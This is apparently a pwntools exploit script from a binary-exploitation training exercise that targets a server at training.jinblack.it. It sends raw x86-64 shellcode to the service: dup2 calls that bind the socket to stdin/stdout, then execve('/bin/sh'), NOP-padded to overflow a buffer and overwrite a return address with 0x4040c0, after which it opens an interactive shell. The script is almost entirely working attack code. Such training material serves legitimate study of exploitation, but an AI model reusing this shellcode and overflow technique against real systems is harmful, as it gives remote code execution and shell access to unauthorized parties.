from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
# context.terminal = ['terminator', '--new-tab', '-x']
# context.terminal = ['gnome-terminal', '--geometry', '104x55-8+0' ,'-- ']

context.log_level = 'debug'
HOST = "training.jinblack.it"
PORT = 2005
PROG = "./server"
LOCAL_PORT = 4000
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process(PROG)
    gdb.attach(r,"""
    set follow-fork-mode child
    b* 0x0040138c
    b* 0x401306
    b *0x401233
    b* 0x004040c0+940
    """)
    input("wait for gdb")
elif args.LOCAL:
    r = remote("localhost", LOCAL_PORT)
elif args.SSH:
    ssh = ssh("ubuntu","192.168.239.131", password="ubuntu")
    ssh.process(PROG)
else:
    r = process(PROG)

input("Start connection.....")

c = remote("localhost", 2005)
input("receving....")






#----------------------------------------



#dup2(4,1)
dup2shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05"

#dup2(1,4)
dup2shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\xC7\xC0\x21\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x04\x00\x00\x00\x0F\x05"



dup2shellcode = b"\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x66\xB8\x21\x00\x48\xC7\xC7\x04\x00\x00\x00\x48\xC7\xC6\x01\x00\x00\x00\x0F\x05\x66\xB8\x21\x00\x48\xC7\xC6\x00\x00\x00\x00\x0F\x05"



shellcode = b"\x48\x31\xC0\x66\xB8\x3B\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x48\x31\xDB\x53\x48\x89\xE6\x48\x89\xF2\x0F\x05\x90"

shellcode = dup2shellcode + shellcode

c.send(shellcode.ljust(1016,b"\x90") + p64(0x004040c0))
c.interactive()


# c.recv()
